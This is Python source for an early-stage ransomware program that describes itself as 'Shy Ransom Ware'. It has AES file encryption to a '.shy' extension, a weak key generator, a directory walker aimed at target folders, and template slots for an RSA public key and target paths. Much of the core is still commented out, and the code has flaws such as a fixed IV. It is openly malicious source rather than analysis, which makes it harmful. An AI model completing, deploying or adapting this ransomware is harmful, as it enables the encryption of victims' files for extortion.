'''
Shy Ransom Ware written in python
'''
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
import random
import string
import os
import logging

def generateKey(length=32):
    """
    generate an encryption key with a given length
    """
    output = ""
    for _ in range(length):
        output += random.choice(string.ascii_uppercase + string.digits)
    return output


def decryptFile(key, filename):
    """
    Encrypt a file given an already created AES object
    Output the file to the filename + extension
    """
    iv = "".join([str(0x00)]*16)
    aesobj = AES.new(key, AES.MODE_CFB, iv)
    # Create the output filename
    outfilename = filename + ".shy"
    # Calculate the filesize
    with open(outfilename, 'rb') as infile:
        with open(filename, 'wb') as outfile:
            # Encrypt and write to the output file
            outfile.write(aesobj.decrypt(infile.read()))


def encryptFile(key, filename):
    """
    Encrypt a file given an already created AES object
    Output the file to the filename + extension
    """
    iv = "".join([str(0x00)]*16)
    aesobj = AES.new(key, AES.MODE_CFB, iv)
    logging.debug("Generated AES object")
    # Create the output filename
    outfilename = filename + ".shy"
    # Calculate the filesize
    with open(filename, 'rb') as infile:
        with open(outfilename, 'wb') as outfile:
            # Encrypt and write to the output file
            outfile.write(aesobj.encrypt(infile.read()))
    logging.info("Encrypted %s", filename)

def walkTargets(targets):
    """
    Walk through all the targets and encrypt them
    """
    for root, dirs, files in os.walk(targets):
        for file_ in files:
            file_ = os.path.join(root, file_)
            logging.debug("Found file %s", file_)


def init():
    # Setup logging
    log_format = "%(asctime)s: %(message)s"
    log_date='%m/%d %H:%M:%S'
    logging.basicConfig(format=log_format, datefmt=log_date, level=logging.DEBUG)
    
    # Jinja will replace the PUBKEY here
    publickey = "{{ RSA_PUBLIC_KEY }}"
    targets = "{{ TARGETS }}"
    targets = "test"
    walkTargets(targets)
    # Create an RSA public key object
    #rsaPubKey = RSA.importKey(publickey)
    #key = generateKey()
    #encryptFile(key, "test.txt")
    #input("sleeping")
    #decryptFile(key, "test.txt")


init()
